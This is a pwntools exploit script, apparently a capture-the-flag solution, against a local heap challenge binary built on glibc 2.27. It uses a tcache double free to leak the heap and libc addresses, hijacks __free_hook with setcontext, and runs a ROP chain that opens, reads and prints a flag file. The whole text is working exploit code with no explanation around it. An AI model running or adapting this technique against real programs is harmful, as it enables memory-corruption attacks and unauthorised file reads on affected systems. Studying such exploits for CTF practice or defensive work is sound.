from pwn import *
context(os='linux',arch='amd64',log_level='debug')
io=process('./pwn')
libc=ELF('libc-2.27.so')
def dbg():
  gdb.attach(io)
  pause()
def choice(choice):
  io.recvuntil("choice: ")
  io.sendline(str(choice))

def add(size):
  choice(1)
  io.recvuntil("Index: ")
  io.sendline(str(0))
  io.recvuntil("Size: ")
  io.sendline(str(size))
  
def edit(content):
  choice(2)
  io.recvuntil("Index: ")
  io.sendline(str(0))
  io.recvuntil("Content: ")
  io.sendline(content)
  
def show():
  choice(3)
  io.recvuntil("Index: ")
  io.sendline(str(0))
  
def free():
  choice(4)
  io.recvuntil("Index: ")
  io.sendline(str(0))

for i in range(7):
  add(0x78)
  edit(b'aa')
for i in range(2):
  edit(b'a'*0x10)
  free()

show()
io.recvuntil(b'Content: ')
heap_base=u64(io.recv(6).ljust(8,b'\x00'))&0xffffffffff000
success('heap_base -> {}'.format(hex(heap_base)))
edit(p64(heap_base+0x10))
add(0x78)
add(0x78)    #finish double free ;success malloc base heap

edit(b'\x00'*0x23+b'\x07')    #change 0x250 tcachebins to 7
free()   #free base_heap
show()
io.recvuntil(b'Content: ')
libc_base=u64(io.recv(6).ljust(8,b'\x00'))-0x3ebca0
success('libc_base -> {}'.format(hex(libc_base)))

payload=b'\x02'*0x40+p64(libc.sym['__free_hook']+libc_base)+p64(0) #free_hook
payload+=p64(heap_base+0x1000)         #flag_addr   heap:0x40
payload+=p64(heap_base+0x2000)         #stack       heap:0x50
payload+=p64(heap_base+0x20a0)         #stack2       heap:0x60
payload+=p64(heap_base+0x3000)         #orw1        heap:0x70
payload+=p64(heap_base+0x3000+0x60)    #orw2        heap:0x80  continue orw1
edit(payload)

pop_rdi=libc_base+0x2164f
pop_rdx=libc_base+0x1b96
pop_rax=libc_base+0x1b500
pop_rsi=libc_base+0x23a6a
ret=libc_base+0x8aa
open=libc.sym['open']+libc_base
read=libc.sym['read']+libc_base
write=libc.sym['write']+libc_base    
syscall=read+15
flag=heap_base+0x1000
setcontext=libc.sym['setcontext']+libc_base+53  #prepare

orw=p64(pop_rdi)+p64(flag)
orw+=p64(pop_rsi)+p64(0)
orw+=p64(pop_rax)+p64(2)
orw+=p64(syscall)      #open(0,flag) (open will delete environment)

orw+=p64(pop_rdi)+p64(3)
orw+=p64(pop_rsi)+p64(heap_base+0x3000)
orw+=p64(pop_rdx)+p64(0x30)
orw+=p64(read)     #read(3,heap+0x3000,0x30) 

orw+=p64(pop_rdi)+p64(1)
orw+=p64(write)    #write(1,heap+0x3000,0x30)
 
#dbg()
add(0x18)      #this is free_hook
edit(p64(setcontext))   #change free_hook to setcontext
add(0x38)

edit(b'/flag\x00\x00')    #heap_base+0x1000

add(0x68)
edit(orw[:0x60])     #orw1
add(0x78)
edit(orw[0x60:])     #orw2
add(0x58)
edit(p64(heap_base+0x3000)+p64(ret))
add(0x48)
free()    #
#dbg()
io.interactive()